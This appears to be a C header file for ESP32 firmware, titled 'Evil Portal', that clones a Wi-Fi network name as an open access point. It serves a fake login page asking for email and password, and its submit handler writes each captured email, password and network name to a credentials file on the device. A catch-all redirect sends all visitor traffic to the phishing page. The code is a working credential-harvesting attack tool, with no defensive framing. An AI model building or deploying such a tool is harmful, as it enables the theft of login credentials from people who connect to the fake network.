// wifi_portal.h - Evil Portal (Network Cloning + Captive Portal)
#ifndef WIFI_PORTAL_H
#define WIFI_PORTAL_H

#include <stdint.h>
#include <string.h>
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "esp_netif.h"
#include "lwip/inet.h"
#include "esp_spiffs.h"
#include <sys/stat.h>

static const char *PORTAL_TAG = "Portal";
static httpd_handle_t portal_server = NULL;
static char portal_ssid[33] = {0};
static uint8_t portal_running = 0;

// DNS spoofing (redirect all domains to portal)
static void portal_dns_task(void *param) {
    // Simple DNS server would go here - simplified for brevity
    vTaskDelete(NULL);
}

// Serve portal HTML
static esp_err_t portal_handler(httpd_req_t *req) {
    FILE *f = fopen("/spiffs/sites/portal.html", "r");
    if (!f) {
        const char *fallback = 
            "<!DOCTYPE html><html><head><title>WiFi Login</title>"
            "<style>body{font-family:Arial;max-width:400px;margin:50px auto;padding:20px}"
            "input{width:100%;padding:10px;margin:10px 0;box-sizing:border-box}"
            "button{width:100%;padding:12px;background:#007bff;color:white;border:none;cursor:pointer}</style>"
            "</head><body><h2>Connect to WiFi</h2><form method='POST' action='/submit'>"
            "<input name='email' placeholder='Email' required>"
            "<input type='password' name='password' placeholder='Password' required>"
            "<button type='submit'>Connect</button></form></body></html>";
        
        httpd_resp_send(req, fallback, strlen(fallback));
        return ESP_OK;
    }
    
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    
    char *html = malloc(fsize + 1);
    fread(html, 1, fsize, f);
    html[fsize] = 0;
    fclose(f);
    
    httpd_resp_send(req, html, fsize);
    free(html);
    return ESP_OK;
}

// Handle credential submission
static esp_err_t portal_submit_handler(httpd_req_t *req) {
    char buf[512];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret <= 0) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    buf[ret] = 0;
    
    // Parse form data
    char email[128] = {0};
    char password[128] = {0};
    
    char *email_start = strstr(buf, "email=");
    char *pass_start = strstr(buf, "password=");
    
    if (email_start) {
        email_start += 6;
        char *email_end = strchr(email_start, '&');
        if (!email_end) email_end = email_start + strlen(email_start);
        int len = email_end - email_start;
        if (len > 127) len = 127;
        strncpy(email, email_start, len);
    }
    
    if (pass_start) {
        pass_start += 9;
        char *pass_end = strchr(pass_start, '&');
        if (!pass_end) pass_end = pass_start + strlen(pass_start);
        int len = pass_end - pass_start;
        if (len > 127) len = 127;
        strncpy(password, pass_start, len);
    }
    
    // Log to file
    FILE *f = fopen("/spiffs/captures/credentials.txt", "a");
    if (f) {
        fprintf(f, "SSID: %s\nEmail: %s\nPassword: %s\n\n", portal_ssid, email, password);
        fclose(f);
        ESP_LOGI(PORTAL_TAG, "Captured: %s / %s", email, password);
    }
    
    // Redirect to "success" or keep showing login
    const char *resp = "<html><body><h2>Connecting...</h2><script>setTimeout(function(){window.location='/';},2000);</script></body></html>";
    httpd_resp_send(req, resp, strlen(resp));
    return ESP_OK;
}

// Catch-all handler (captive portal redirect)
static esp_err_t portal_catchall_handler(httpd_req_t *req) {
    const char *redirect = "<html><head><meta http-equiv='refresh' content='0;url=/'></head></html>";
    httpd_resp_send(req, redirect, strlen(redirect));
    return ESP_OK;
}

// Start portal
static inline uint8_t portal_start(const char *ssid) {
    if (portal_running) return 0;
    
    strncpy(portal_ssid, ssid, 32);
    portal_ssid[32] = 0;
    
    // Init WiFi (safe for re-init)
    esp_err_t err;
    err = esp_netif_init();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
    err = esp_event_loop_create_default();
    if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) ESP_ERROR_CHECK(err);
    
    if (!esp_netif_get_handle_from_ifkey("WIFI_AP_DEF")) {
        esp_netif_create_default_wifi_ap();
    }
    
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    
    wifi_config_t wifi_config = {
        .ap = {
            .ssid_len = strlen(ssid),
            .channel = 1,
            .max_connection = 10,
            .authmode = WIFI_AUTH_OPEN
        },
    };
    strncpy((char*)wifi_config.ap.ssid, ssid, 32);
    
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
    esp_wifi_start();
    
    ESP_LOGI(PORTAL_TAG, "AP started: %s", ssid);
    
    // Start HTTP server
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.uri_match_fn = httpd_uri_match_wildcard;
    
    if (httpd_start(&portal_server, &config) == ESP_OK) {
        httpd_uri_t uri_root = {.uri = "/", .method = HTTP_GET, .handler = portal_handler};
        httpd_uri_t uri_submit = {.uri = "/submit", .method = HTTP_POST, .handler = portal_submit_handler};
        httpd_uri_t uri_catchall = {.uri = "/*", .method = HTTP_GET, .handler = portal_catchall_handler};
        
        httpd_register_uri_handler(portal_server, &uri_root);
        httpd_register_uri_handler(portal_server, &uri_submit);
        httpd_register_uri_handler(portal_server, &uri_catchall);
        
        ESP_LOGI(PORTAL_TAG, "Portal started on 192.168.4.1");
        portal_running = 1;
        return 1;
    }
    
    return 0;
}

// Stop portal
static inline void portal_stop(void) {
    if (!portal_running) return;
    
    if (portal_server) {
        httpd_stop(portal_server);
        portal_server = NULL;
    }
    
    esp_wifi_stop();
    portal_running = 0;
    ESP_LOGI(PORTAL_TAG, "Portal stopped");
}

static inline uint8_t portal_is_running(void) {
    return portal_running;
}

#endif
